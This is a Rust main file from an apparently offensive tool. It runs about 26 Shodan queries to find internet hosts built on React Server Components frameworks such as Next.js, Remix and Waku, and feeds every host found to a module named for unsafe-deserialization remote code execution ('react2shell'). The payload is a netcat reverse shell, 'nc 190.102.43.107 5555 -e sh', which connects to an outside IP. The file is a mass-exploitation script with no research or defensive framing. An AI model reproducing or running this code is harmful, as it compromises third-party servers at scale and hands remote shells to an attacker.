mod exploit;
mod frameworks;
mod osint;

use crate::exploit::react::react_unsafely_deserialize_rce;
use crate::osint::shodan::{shodan_queries,shodan as shodan};
#[tokio::main]
async fn main() {
    let prefix_payload = "nc 190.102.43.107 5555 -e sh";
    let shodan = shodan::Shodan::new(String::from(""));

    // let shodan_next_basic_filters = shodan::Filters {
    //     http_component: vec!["'Next.js'".into()],
    //     product: Some("Next.js".into()),
    //     http_title: Some("Next.js".into()),
    //     ..Default::default()
    // };

    let rsp_shodan_rsdw_webpack = shodan.query_raw_many(shodan_queries::shodan_rsdw_webpack()).await;
    let rsp_shodan_rsd_parcel = shodan.query_raw_many(shodan_queries::shodan_rsd_parcel()).await;
    let rsp_shodan_rsd_turbopack = shodan.query_raw_many(shodan_queries::shodan_rsd_turbopack()).await;
    let rsp_shodan_nextjs = shodan.query_raw_many(shodan_queries::shodan_nextjs()).await;
    let rsp_shodan_react_router_rsc = shodan.query_raw_many(shodan_queries::shodan_react_router_rsc()).await;
    let rsp_shodan_waku = shodan.query_raw_many(shodan_queries::shodan_waku()).await;
    let rsp_shodan_redwoodjs = shodan.query_raw_many(shodan_queries::shodan_redwoodjs()).await;
    let rsp_shodan_vite_rsc = shodan.query_raw_many(shodan_queries::shodan_vite_rsc()).await;
    let rsp_shodan_parcel_rsc = shodan.query_raw_many(shodan_queries::shodan_parcel_rsc()).await;
    let rsp_shodan_webpack_rsc = shodan.query_raw_many(shodan_queries::shodan_webpack_rsc()).await;
    let rsp_shodan_turbopack = shodan.query_raw_many(shodan_queries::shodan_turbopack()).await;
    let rsp_shodan_expo_rsc = shodan.query_raw_many(shodan_queries::shodan_expo_rsc()).await;
    let rsp_shodan_jest_expo_rsc = shodan.query_raw_many(shodan_queries::shodan_jest_expo_rsc()).await;
    let rsp_shodan_tanstack_start = shodan.query_raw_many(shodan_queries::shodan_tanstack_start()).await;
    let rsp_shodan_tanstack_router_rsc = shodan.query_raw_many(shodan_queries::shodan_tanstack_router_rsc()).await;
    let rsp_shodan_remix_rsc = shodan.query_raw_many(shodan_queries::shodan_remix_rsc()).await;
    let rsp_shodan_lazarv_react_server = shodan.query_raw_many(shodan_queries::shodan_lazarv_react_server()).await;
    let rsp_shodan_shopify_hydrogen = shodan.query_raw_many(shodan_queries::shodan_shopify_hydrogen()).await;
    let rsp_shodan_gatsby_rsc = shodan.query_raw_many(shodan_queries::shodan_gatsby_rsc()).await;
    let rsp_shodan_astro_rsc = shodan.query_raw_many(shodan_queries::shodan_astro_rsc()).await;
    let rsp_shodan_qwik_react = shodan.query_raw_many(shodan_queries::shodan_qwik_react()).await;
    let rsp_shodan_docusaurus = shodan.query_raw_many(shodan_queries::shodan_docusaurus()).await;
    let rsp_shodan_refine = shodan.query_raw_many(shodan_queries::shodan_refine()).await;
    let rsp_shodan_plasmic_rsc = shodan.query_raw_many(shodan_queries::shodan_plasmic_rsc()).await;
    let rsp_shodan_kendoreact_rsc = shodan.query_raw_many(shodan_queries::shodan_kendoreact_rsc()).await;
    let rsp_shodan_custom_rsc = shodan.query_raw_many(shodan_queries::shodan_custom_rsc()).await;

    let rsdw_webpack_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_rsdw_webpack).await;
    let rsd_parcel_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_rsd_parcel).await;
    let rsd_turbopack_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_rsd_turbopack).await;
    let nextjs_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_nextjs).await;
    let react_router_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_react_router_rsc).await;
    let waku_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_waku).await;
    let redwoodjs_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_redwoodjs).await;
    let vite_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_vite_rsc).await;
    let parcel_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_parcel_rsc).await;
    let webpack_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_webpack_rsc).await;
    let turbopack_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_turbopack).await;
    let expo_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_expo_rsc).await;
    let jest_expo_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_jest_expo_rsc).await;
    let tanstack_start_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_tanstack_start).await;
    let tanstack_router_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_tanstack_router_rsc).await;
    let remix_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_remix_rsc).await;
    let lazarv_react_server_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_lazarv_react_server).await;
    let shopify_hydrogen_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_shopify_hydrogen).await;
    let gatsby_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_gatsby_rsc).await;
    let astro_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_astro_rsc).await;
    let qwik_react_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_qwik_react).await;
    let docusaurus_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_docusaurus).await;
    let refine_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_refine).await;
    let plasmic_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_plasmic_rsc).await;
    let kendoreact_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_kendoreact_rsc).await;
    let custom_rsc_hosts_many = shodan.get_hosts_from_responses(rsp_shodan_custom_rsc).await;

    let mut all_hosts: Vec<String> = Vec::new();

    all_hosts.extend(rsdw_webpack_hosts_many);
    all_hosts.extend(rsd_parcel_hosts_many);
    all_hosts.extend(rsd_turbopack_hosts_many);
    all_hosts.extend(nextjs_hosts_many);
    all_hosts.extend(react_router_rsc_hosts_many);
    all_hosts.extend(waku_hosts_many);
    all_hosts.extend(redwoodjs_hosts_many);
    all_hosts.extend(vite_rsc_hosts_many);
    all_hosts.extend(parcel_rsc_hosts_many);
    all_hosts.extend(webpack_rsc_hosts_many);
    all_hosts.extend(turbopack_hosts_many);
    all_hosts.extend(expo_rsc_hosts_many);
    all_hosts.extend(jest_expo_rsc_hosts_many);
    all_hosts.extend(tanstack_start_hosts_many);
    all_hosts.extend(tanstack_router_rsc_hosts_many);
    all_hosts.extend(remix_rsc_hosts_many);
    all_hosts.extend(lazarv_react_server_hosts_many);
    all_hosts.extend(shopify_hydrogen_hosts_many);
    all_hosts.extend(gatsby_rsc_hosts_many);
    all_hosts.extend(astro_rsc_hosts_many);
    all_hosts.extend(qwik_react_hosts_many);
    all_hosts.extend(docusaurus_hosts_many);
    all_hosts.extend(refine_hosts_many);
    all_hosts.extend(plasmic_rsc_hosts_many);
    all_hosts.extend(kendoreact_rsc_hosts_many);
    all_hosts.extend(custom_rsc_hosts_many);


    let react2shell = react_unsafely_deserialize_rce::ReactUnsafelyDeserializeRce::new(
        prefix_payload.parse().unwrap(),
        all_hosts,
        10,
    );
    react2shell.start().await.expect("TODO: panic message");
    // println!("{total:?}");
}
